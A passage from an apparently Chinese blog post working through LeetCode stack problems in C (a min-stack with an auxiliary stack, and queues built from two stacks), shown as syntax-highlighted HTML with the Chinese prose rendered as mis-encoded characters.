class="comment">/** initialize your data structure here. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">MinStack* <span class="title">minStackCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack * stack = (MinStack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(MinStack));</span><br><span class="line">    stack-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> stack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">minStackPush</span><span class="params">(MinStack* obj, <span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack * stack = (MinStack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(MinStack));</span><br><span class="line">    stack-&gt;value = obj-&gt;value;</span><br><span class="line">    stack-&gt;next = obj-&gt;next;</span><br><span class="line">    obj-&gt;value = x;</span><br><span class="line">    obj-&gt;next = stack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">minStackPop</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    obj-&gt;value = obj-&gt;next-&gt;value;</span><br><span class="line">    obj-&gt;next = obj-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">minStackTop</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">minStackGetMin</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> min = obj-&gt;value;</span><br><span class="line">    obj = obj-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        min = min&lt;obj-&gt;value?min:obj-&gt;value;</span><br><span class="line">        obj = obj-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">minStackFree</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack* temp;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj;</span><br><span class="line">        obj = obj-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack* obj = minStackCreate();</span></span><br><span class="line"><span class="comment"> * minStackPush(obj, x);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * minStackPop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_3 = minStackTop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_4 = minStackGetMin(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * minStackFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>çœ‹å¾—å‡ºæ¥ä¼¼ä¹æ—¶é—´å¤æ‚åº¦å¤ªé«˜äº†äº›ï¼Œé—®é¢˜å‡ºåœ¨å“ªå‘¢ï¼Ÿ</p><p><img src="https://i.loli.net/2020/09/06/sbTDOJEnf4x8vg6.png" alt="image.png"></p><p>é‡æ–°è¯»ä¸€éé¢˜ç›®æˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸ªç‰¹æ®Šçš„è¦æ±‚â€”â€”<strong>pushã€popã€minçš„æ—¶é—´å¤æ‚åº¦å¿…é¡»ä¸ºO(1)<strong>ï¼Œè€Œæˆ‘ä»¬éå†ä¸€éæ ˆæ£€ç´¢æœ€å°å€¼çš„è¿‡ç¨‹çš„æ—¶é—´å¤æ‚åº¦</strong>è‡³å°‘æ˜¯O(N)</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿç­”æ¡ˆæ˜¯<strong>ä½¿ç”¨å¦å¤–ä¸€ä¸ªæ ˆæ¥ä¿å­˜æœ€å°å€¼</strong>ï¼Œæ¯å½“é‡åˆ°æ¯”æœ€å°å€¼å°çš„å…ƒç´ å…¥æ ˆæ—¶å°†ä¹‹ä¹Ÿå…¥æœ€å°å€¼æ ˆï¼Œè¯¥å…ƒç´ å‡ºæ ˆæ—¶æœ€å°å€¼æ ˆä¹Ÿå‡ºæ ˆï¼Œåœ¨éœ€è¦å–æ ˆæœ€å°å€¼æ—¶<strong>ç›´æ¥å–è¯¥æœ€å°å€¼æ ˆçš„æ ˆé¡¶</strong>å³å¯</p><p>æ•…æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Stack</span>&#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Stack</span> * next;</span><br><span class="line">&#125; MinStack;</span><br><span class="line">MinStack *min_stack;</span><br><span class="line"><span class="comment">/** initialize your data structure here. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">MinStack* <span class="title">minStackCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack * stack = (MinStack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(MinStack));</span><br><span class="line">    min_stack = (MinStack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(MinStack));</span><br><span class="line">    stack-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    min_stack-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> stack;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">minStackPush</span><span class="params">(MinStack* obj, <span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack * stack = (MinStack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(MinStack));</span><br><span class="line">    stack-&gt;value = obj-&gt;value;</span><br><span class="line">    stack-&gt;next = obj-&gt;next;</span><br><span class="line">    obj-&gt;value = x;</span><br><span class="line">    obj-&gt;next = stack;</span><br><span class="line">    <span class="keyword">if</span>(min_stack-&gt;next==<span class="literal">NULL</span>||x&lt;=min_stack-&gt;value)</span><br><span class="line">    &#123;</span><br><span class="line">        stack = (MinStack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(MinStack));</span><br><span class="line">        stack-&gt;value = min_stack-&gt;value;</span><br><span class="line">        stack-&gt;next = min_stack-&gt;next;</span><br><span class="line">        min_stack-&gt;value = x;</span><br><span class="line">        min_stack-&gt;next = stack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">minStackPop</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;value == min_stack-&gt;value&amp;&amp;min_stack-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        min_stack-&gt;value = min_stack-&gt;next-&gt;value;</span><br><span class="line">        min_stack-&gt;next = min_stack-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    obj-&gt;value = obj-&gt;next-&gt;value;</span><br><span class="line">    obj-&gt;next = obj-&gt;next-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">minStackTop</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">minStackGetMin</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> min_stack-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">minStackFree</span><span class="params">(MinStack* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MinStack* temp;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj;</span><br><span class="line">        obj = obj-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(min_stack-&gt;next!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = min_stack;</span><br><span class="line">        min_stack = min_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack* obj = minStackCreate();</span></span><br><span class="line"><span class="comment"> * minStackPush(obj, x);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * minStackPop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_3 = minStackTop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_4 = minStackGetMin(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * minStackFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/IJsPh9ElX8fWTum.png" alt="image.png"></p><h2 id="0x04-åŒ–æ ˆä¸ºé˜Ÿ"><a href="#0x04-åŒ–æ ˆä¸ºé˜Ÿ" class="headerlink" title="0x04.åŒ–æ ˆä¸ºé˜Ÿ"></a>0x04.<a href="https://leetcode-cn.com/problems/implement-queue-using-stacks-lcci">åŒ–æ ˆä¸ºé˜Ÿ</a></h2><blockquote><p>å®ç°ä¸€ä¸ªMyQueueç±»ï¼Œè¯¥ç±»ç”¨ä¸¤ä¸ªæ ˆæ¥å®ç°ä¸€ä¸ªé˜Ÿåˆ—ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>MyQueue queue &#x3D; new MyQueue();</p><p>queue.push(1);<br>queue.push(2);<br>queue.peek();  &#x2F;&#x2F; è¿”å› 1<br>queue.pop();   &#x2F;&#x2F; è¿”å› 1<br>queue.empty(); &#x2F;&#x2F; è¿”å› false</p><p>è¯´æ˜ï¼š</p><p>ä½ åªèƒ½ä½¿ç”¨æ ‡å‡†çš„æ ˆæ“ä½œ â€“ ä¹Ÿå°±æ˜¯åªæœ‰ push to top, peek&#x2F;pop from top, size å’Œ is empty æ“ä½œæ˜¯åˆæ³•çš„ã€‚<br>ä½ æ‰€ä½¿ç”¨çš„è¯­è¨€ä¹Ÿè®¸ä¸æ”¯æŒæ ˆã€‚ä½ å¯ä»¥ä½¿ç”¨ list æˆ–è€… dequeï¼ˆåŒç«¯é˜Ÿåˆ—ï¼‰æ¥æ¨¡æ‹Ÿä¸€ä¸ªæ ˆï¼Œåªè¦æ˜¯æ ‡å‡†çš„æ ˆæ“ä½œå³å¯ã€‚<br>å‡è®¾æ‰€æœ‰æ“ä½œéƒ½æ˜¯æœ‰æ•ˆçš„ ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªç©ºçš„é˜Ÿåˆ—ä¸ä¼šè°ƒç”¨ pop æˆ–è€… peek æ“ä½œï¼‰ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/implement-queue-using-stacks-lcci">https://leetcode-cn.com/problems/implement-queue-using-stacks-lcci</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>æ®è¯´æ˜¯ä¸€é“é¢è¯•é¢˜ï¼ˆ<del>å½“ç„¶ç©¶ç«Ÿé¢è¯•ä¼šä¸ä¼šè€ƒè¿™ä¹ˆç®€å•çš„é¢˜æˆ‘æš‚ä¸”è’™åœ¨å¤é‡Œ</del></p><p>é¢˜ç›®è¦æ±‚<strong>ç”¨ä¸¤ä¸ªæ ˆ</strong>æ¥æ¨¡æ‹Ÿä¸€ä¸ªé˜Ÿåˆ—ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°å¯ä»¥ä½¿ä¸€ä¸ªæ ˆ<code>in_stack</code>è´Ÿè´£å¤„ç†pushçš„å…ƒç´ ï¼Œä¸€ä¸ªæ ˆ<code>out_stack</code>è´Ÿè´£å¤„ç†popçš„å…ƒç´ </p><p>å½“å…ƒç´ éœ€è¦å‡ºé˜Ÿæ—¶ï¼š</p><ul><li>æ£€æŸ¥out_stackæ˜¯å¦ä¸ºç©º</li><li>è‹¥out_stackä¸ºç©ºåˆ™å°†in_stackä¸­å…ƒç´ é€ä¸€å‡ºæ ˆå¹¶é€ä¸€å…¥out_stackæ ˆä¸­ï¼Œ<strong>å®Œæˆé€†åºæ ˆæ„é€ </strong></li><li>å°†out_stackæ ˆé¡¶å…ƒç´ pop</li></ul><p>æ•…æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">stack</span>&#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stack</span>* next;</span><br><span class="line">&#125;Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">&#123;</span><br><span class="line">    Stack * in_stack;</span><br><span class="line">    Stack * out_stack;</span><br><span class="line">&#125; MyQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">MyQueue* <span class="title">myQueueCreate</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MyQueue * myQueue = (MyQueue*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(MyQueue));</span><br><span class="line">    myQueue-&gt;in_stack = <span class="literal">NULL</span>;</span><br><span class="line">    myQueue-&gt;out_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> myQueue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Push element x to the back of queue. */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myQueuePush</span><span class="params">(MyQueue* obj, <span class="type">int</span> x)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack *s = (Stack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Stack));</span><br><span class="line">    s-&gt;value = x;</span><br><span class="line">    s-&gt;next = obj-&gt;in_stack;</span><br><span class="line">    obj-&gt;in_stack = s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Removes the element from in front of queue and returns that element. */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">myQueuePop</span><span class="params">(MyQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack * temp;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;out_stack == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = obj-&gt;out_stack;</span><br><span class="line">            obj-&gt;out_stack = obj-&gt;in_stack;</span><br><span class="line">            obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">            obj-&gt;out_stack-&gt;next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> n = obj-&gt;out_stack-&gt;value;</span><br><span class="line">    temp = obj-&gt;out_stack;</span><br><span class="line">    obj-&gt;out_stack = obj-&gt;out_stack-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(temp);</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Get the front element. */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">myQueuePeek</span><span class="params">(MyQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack * temp;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;out_stack == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = obj-&gt;out_stack;</span><br><span class="line">            obj-&gt;out_stack = obj-&gt;in_stack;</span><br><span class="line">            obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">            obj-&gt;out_stack-&gt;next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;out_stack-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Returns whether the queue is empty. */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">myQueueEmpty</span><span class="params">(MyQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>||obj-&gt;out_stack!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myQueueFree</span><span class="params">(MyQueue* obj)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Stack*temp;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;in_stack!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj-&gt;in_stack;</span><br><span class="line">        obj-&gt;in_stack = obj-&gt;in_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(obj-&gt;out_stack!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = obj-&gt;out_stack;</span><br><span class="line">        obj-&gt;out_stack = obj-&gt;out_stack-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue struct will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue* obj = myQueueCreate();</span></span><br><span class="line"><span class="comment"> * myQueuePush(obj, x);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_2 = myQueuePop(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * int param_3 = myQueuePeek(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * bool param_4 = myQueueEmpty(obj);</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> * myQueueFree(obj);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/y3brkdqxl6FYhjO.png" alt="image.png"></p><h2 id="0x05-å‰‘æŒ‡-Offer-09-ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—"><a href="#0x05-å‰‘æŒ‡-Offer-09-ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—" class="headerlink" title="0x05.å‰‘æŒ‡ Offer 09. ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—"></a>0x05.<a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/">å‰‘æŒ‡ Offer 09. ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—</a></h2><blockquote><p>ç”¨ä¸¤ä¸ªæ ˆå®ç°ä¸€ä¸ªé˜Ÿåˆ—ã€‚é˜Ÿåˆ—çš„å£°æ˜å¦‚ä¸‹ï¼Œè¯·å®ç°å®ƒçš„ä¸¤ä¸ªå‡½æ•° appendTail å’Œ deleteHead ï¼Œåˆ†åˆ«å®Œæˆåœ¨é˜Ÿåˆ—å°¾éƒ¨æ’å…¥æ•´æ•°å’Œåœ¨é˜Ÿåˆ—å¤´éƒ¨åˆ é™¤æ•´æ•°çš„åŠŸèƒ½ã€‚(è‹¥é˜Ÿåˆ—ä¸­æ²¡æœ‰å…ƒç´ ï¼ŒdeleteHead æ“ä½œè¿”å› -1 )</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥ï¼š<br>[â€œCQueueâ€,â€appendTailâ€,â€deleteHeadâ€,â€deleteHeadâ€]<br>[[],[3],[],[]]<br>è¾“å‡ºï¼š[null,null,3,-1]<br>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥ï¼š<br>[â€œCQueueâ€,â€deleteHeadâ€,â€appendTailâ€,â€appendTailâ€,â€deleteHeadâ€,â€deleteHeadâ€]<br>[[],[],[5],[2],[],[]]<br>è¾“å‡ºï¼š[null,-1,null,null,5,2]<br>æç¤ºï¼š</p><p>1 &lt;&#x3D; values &lt;&#x3D; 10000<br>æœ€å¤šä¼šå¯¹ appendTailã€deleteHead è¿›è¡Œ 10000 æ¬¡è°ƒç”¨</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof">https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>å’Œè¿™é“é¢˜å‡ ä¹ä¸€æ ·çš„é¢˜ï¼ˆ<del>è¿™ç§é¢˜éƒ½èƒ½ä¸Šå‰‘æŒ‡offerä¹ˆï¼Œè’Ÿè’»OIeræš‚ä¸”è’™åœ¨å¤é‡Œ</del>ï¼‰ï¼Œè¿™ä¸€æ¬¡ç»™å®šäº†å¤§å°ï¼Œä¸ºäº†çœäº‹æˆ‘ä»¬é€‰æ‹©ä½¿ç”¨æ•°ç»„æ¥æ¨¡æ‹Ÿæ ˆ</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 